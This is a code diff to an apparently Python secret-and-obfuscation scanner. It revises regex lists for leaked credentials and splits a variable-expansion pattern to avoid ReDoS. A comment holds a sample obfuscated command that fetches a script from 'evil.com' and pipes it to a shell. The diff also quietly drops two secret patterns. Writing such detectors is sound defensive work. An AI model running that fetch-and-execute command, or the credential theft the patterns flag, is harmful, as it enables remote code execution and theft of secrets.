@@ -81,21 +81,18 @@ _SECRET_PATTERNS: list[re.Pattern] = [
         r"(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY)\s*=\s*[A-Za-z0-9/+=]{16,}",
         r"(?:ghp|ghs|ghu|github_pat)_[A-Za-z0-9]{36,}",
         r"-----BEGIN\s+(?:RSA|EC|OPENSSH|DSA|PGP)\s+PRIVATE\s+KEY-----",
-        r"(?:password|passwd|pwd)\s*[:=]\s*\S{8,}",
+        r"(?:password|passwd)\s*[:=]\s*\S{8,}",
         r"(?:api[_-]?key|secret[_-]?key|access[_-]?token)\s*[:=]\s*['\"]?\S{16,}",
-        r"Authorization:\s+Bearer\s+[A-Za-z0-9._-]{20,}",
+        # Bearer tokens (covers Authorization: Bearer and other contexts)
+        r"(?:^|[\s,;\"'])Bearer\s+[a-zA-Z0-9._\-]{20,}",
         r"DATABASE_URL\s*=\s*\S+://\S+:\S+@",
         r"OPENAI_API_KEY\s*=\s*sk-[A-Za-z0-9]{20,}",
-        # OpenAI API keys (context-constrained sk- / sk-proj- pattern)
-        r"(?:key|token|api_?key|secret)\s*[:=]\s*sk-(?:proj-)?[a-zA-Z0-9]{20,}",
         # AWS access key IDs (IAM format)
         r"AKIA[A-Z0-9]{16}",
         # Slack tokens (bot, user, workspace, refresh)
         r"xox[bprs]-[a-zA-Z0-9\-]{10,}",
         # Feishu/Lark tokens (context-constrained to avoid bare t- FP)
         r"(?:tenant_access_token|user_access_token|app_access_token)\s*[:=]\s*t-[a-zA-Z0-9]{20,}",
-        # Bearer tokens (word-boundary constrained)
-        r"(?:^|[\s,;\"'])Bearer\s+[a-zA-Z0-9._\-]{20,}",
         # Ethereum private key (context-constrained to avoid SHA-256 FP)
         r"(?:private[_\s-]?key|priv[_\s-]?key|wallet[_\s-]?key)\s*[:=]\s*['\"]?0x[a-fA-F0-9]{64}",
     ]
@@ -139,8 +136,11 @@ _OBFUSCATION_PATTERNS: list[tuple[re.Pattern, str]] = [
         # Scripting language with encoded execution
         (r"(?:python[23]?|perl|ruby)\s+-[ec]\s+.*(?:base64|b64decode|decode|exec|eval)", re.I, "script-exec-encoded"),
         # Variable expansion obfuscation (a=cu;b=rl;$a$b http://evil.com | sh)
-        # Requires execution indicators after expanded vars to reduce FP on normal shell
-        (r"(?:[a-zA-Z_]\w{0,2}=[^;\s]+\s*;\s*){2,}[^$]*\$(?:[a-zA-Z_]|\{[a-zA-Z_]).*?(?:\||>|;.*?sh\b|`|/tmp/|/dev/|https?://)", 0, "var-expansion"),
+        # Split into two patterns to avoid nested repetition ReDoS:
+        # 1) Detect >=2 short var assignments followed by $ expansion
+        (r"(?:[a-zA-Z_]\w{0,2}=[^;\s]+;){2,}[^;$]{0,40}\$[a-zA-Z_{]", 0, "var-expansion"),
+        # 2) Detect $ expansion followed by execution indicators
+        (r"\$[a-zA-Z_{][^\n]{0,60}(?:\||>|`|/tmp/|/dev/|https?://)", 0, "var-exec-trigger"),
         # Existing patterns preserved
         (r"\[::-1\]", 0, "reverse-slice"),
         (r"\\x[0-9a-f]{2}", re.I, "hex-char"),
@@ -184,7 +184,7 @@ def detect_obfuscation(text: str) -> float:
     hits = 0
     for pat, pid in _OBFUSCATION_PATTERNS:
         if pat.search(normalized):
-            if pid == "curl-pipe-shell" and _is_safe_curl_pipe(normalized):
+            if pid == "curl-pipe-shell" and _is_safe_curl_pipe(text) and _is_safe_curl_pipe(normalized):
                 continue
             hits += 1
     pattern_score = hits * 0.3
